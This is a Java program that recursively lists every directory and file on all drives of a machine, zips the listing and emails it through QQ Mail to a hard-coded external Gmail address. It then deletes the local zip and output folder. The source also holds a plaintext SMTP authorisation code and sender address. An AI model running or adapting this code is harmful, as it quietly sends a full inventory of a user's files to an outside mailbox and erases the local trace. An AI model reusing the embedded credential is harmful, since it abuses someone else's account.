package org.example;


import org.apache.commons.io.FileUtils;

import javax.mail.*;
import javax.mail.internet.*;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Properties;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class AutoSendTxtByEmail {
    // -------------------------- 基本配置（按需修改） --------------------------
    private static File[] ROOTS_TO_SCAN = detectSystemRoots();             // 要遍历的所有根目录
    private static Path   WORK_BASE      = Paths.get("E:\\Scan-Exports");  // 结果输出的根目录

    private static final String SENDER_EMAIL   = "1968065099@qq.com";    // 发件人（QQ 邮箱）
    private static final String RECEIVER_EMAIL = "dashuaige0079@gmail.com"; // 收件人

    // 推荐：把授权码放到环境变量 QQMAIL_AUTH_CODE 中；若未设置，则使用下面的常量（不安全）
    private static final String FALLBACK_AUTH_CODE = "vsvvgbkttohjejae"; // 仅示例！建议改为环境变量
    // -----------------------------------------------------------------------

    public static void main(String[] args) throws Exception {
        // 支持命令行传参覆盖：ROOTS(分号分隔)、WORK_BASE、RECEIVER
        if (args.length >= 1) {
            ROOTS_TO_SCAN = Arrays.stream(args[0].split(";"))
                    .map(String::trim)
                    .filter(s -> !s.isEmpty())
                    .map(File::new)
                    .toArray(File[]::new);
            if (ROOTS_TO_SCAN.length == 0) {
                ROOTS_TO_SCAN = detectSystemRoots();
            }
        }
        if (args.length >= 2) WORK_BASE = Paths.get(args[1]);
        if (args.length >= 3) ; // 保留可扩展

        // 1) 先创建“带时间戳的新文件夹”
        String stamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss"));
        Path outDir = WORK_BASE.resolve("scan_" + stamp);
        Files.createDirectories(outDir);

        // 2) 生成一级目录与完整树
        Path level1Txt = outDir.resolve("level-1-directories.txt");
        Path fullTreeTxt = outDir.resolve("full-tree.txt");

        writeLevel1(ROOTS_TO_SCAN, level1Txt);
        writeFullTree(ROOTS_TO_SCAN, fullTreeTxt);

        // 3) 打包 ZIP（打包 outDir 本身）
        Path zipPath = Paths.get(outDir.toString() + ".zip");
        zipDirectory(outDir, zipPath);

        // 4) 发送邮件（把 ZIP 作为附件）
        sendEmailWithAttachment(
                SENDER_EMAIL,
                RECEIVER_EMAIL,
                "生成的目录清单与完整树：" + stamp,
                "自动遍历完成于 " + stamp + "，请查收附件 ZIP（内含 level-1-directories.txt 与 full-tree.txt）。",
                zipPath.toFile()
        );

        System.out.println("OK");

//         5) （可选）清理演示文件
         Files.deleteIfExists(zipPath);
         FileUtils.deleteDirectory(outDir.toFile());
    }

    /** 生成一级目录清单 */
    private static void writeLevel1(File[] roots, Path output) throws IOException {
        Files.createDirectories(output.getParent());

        try (BufferedWriter w = Files.newBufferedWriter(output, StandardCharsets.UTF_8)) {
            for (File root : roots) {
                if (root == null || !root.exists()) {
                    continue;
                }
                w.write("# " + root.getAbsolutePath());
                w.newLine();

                File[] children = root.listFiles(File::isDirectory);
                if (children != null && children.length > 0) {
                    Arrays.sort(children, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));
                    for (File c : children) {
                        w.write(c.getAbsolutePath());
                        w.newLine();
                    }
                }

                w.newLine();
            }
        }
    }

    /** 递归写完整树（目录+文件） */
    private static void writeFullTree(File[] roots, Path output) throws IOException {
        Files.createDirectories(output.getParent());
        try (BufferedWriter w = Files.newBufferedWriter(output, StandardCharsets.UTF_8)) {
            for (File root : roots) {
                if (root == null || !root.exists()) {
                    continue;
                }
                w.write("# ROOT: " + root.getAbsolutePath());
                w.newLine();
                walk(root, w);
                w.newLine();
            }
        }
    }

    /** 递归遍历（忽略权限/单项错误不中断） */
    private static void walk(File f, BufferedWriter w) throws IOException {
        try {
            w.write(f.getAbsolutePath());
            w.newLine();
        } catch (IOException ignored) {}

        if (f.isDirectory()) {
            File[] list = f.listFiles();
            if (list == null) return;
            for (File child : list) {
                try {
                    walk(child, w);
                } catch (Exception e) {
                    // 忽略单项失败
                }
            }
        }
    }

    private static File[] detectSystemRoots() {
        File[] roots = File.listRoots();
        if (roots == null || roots.length == 0) {
            return new File[] { new File("/") };
        }
        return roots;
    }

    /** 将目录打包为 zip */
//    private static void zipDirectory(Path sourceDir, Path zipFile) throws IOException {
//        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFile))) {
//            Files.walk(sourceDir).forEach(path -> {
//                try {
//                    if (Files.isDirectory(path)) return;
//                    String entryName = sourceDir.relativize(path).toString().replace('\\', '/');
//                    zos.putNextEntry(new ZipEntry(entryName));
//                    Files.copy(path, zos);
//                    zos.closeEntry();
//                } catch (IOException e) {
//                    // 忽略单文件失败
//                }
//            });
//        }
//    }
    /** 将目录打包为 zip，保留目录结构 */
    private static void zipDirectory(Path sourceDir, Path zipFile) throws IOException {
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFile))) {
            Files.walk(sourceDir).forEach(path -> {
                try {
                    // 过滤掉根目录本身，只处理文件和子目录
                    if (Files.isDirectory(path)) {
                        return;
                    }
                    // 计算路径相对于 sourceDir 的相对路径
                    String entryName = sourceDir.relativize(path).toString().replace('\\', '/');

                    // 创建 ZipEntry（相对路径会自动保证文件结构）
                    zos.putNextEntry(new ZipEntry(entryName));

                    // 将文件内容写入 ZIP
                    Files.copy(path, zos);
                    zos.closeEntry();
                } catch (IOException e) {
                    e.printStackTrace(); // 打印错误信息，或记录日志
                }
            });
        }
    }


    /**
     * 使用 QQ 邮箱（SSL 465）发送带附件的邮件
     */
    private static void sendEmailWithAttachment(String from, String to, String subject, String html, File attachmentFile)
            throws MessagingException, IOException {

        // —— 1) 取授权码，并做成 final 变量，便于在匿名类中捕获 ——
        String env = System.getenv("QQMAIL_AUTH_CODE");
        final String authCodeFinal = (env != null && !env.isEmpty()) ? env : FALLBACK_AUTH_CODE;

        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.smtp.host", "smtp.qq.com");
        props.setProperty("mail.smtp.auth", "true");
        props.setProperty("mail.smtp.port", "465");
        props.setProperty("mail.smtp.ssl.enable", "true");
        // 如需老写法也可：props.setProperty("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");

        // —— 2) 这里捕获的是 final 的 authCodeFinal ——
        Session session = Session.getInstance(props, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(from, authCodeFinal);
            }
        });
        session.setDebug(false);

        MimeMessage message = new MimeMessage(session);
        message.setFrom(new InternetAddress(from));
        message.setRecipient(Message.RecipientType.TO, new InternetAddress(to));
        message.setSubject(subject, "UTF-8");

        Multipart multipart = new MimeMultipart();
        MimeBodyPart textPart = new MimeBodyPart();
        textPart.setContent(html, "text/html; charset=UTF-8");
        multipart.addBodyPart(textPart);

        MimeBodyPart filePart = new MimeBodyPart();
        filePart.attachFile(attachmentFile);
        filePart.setFileName(MimeUtility.encodeText(attachmentFile.getName(), "UTF-8", "B"));
        multipart.addBodyPart(filePart);

        message.setContent(multipart);
        Transport.send(message);
    }

}
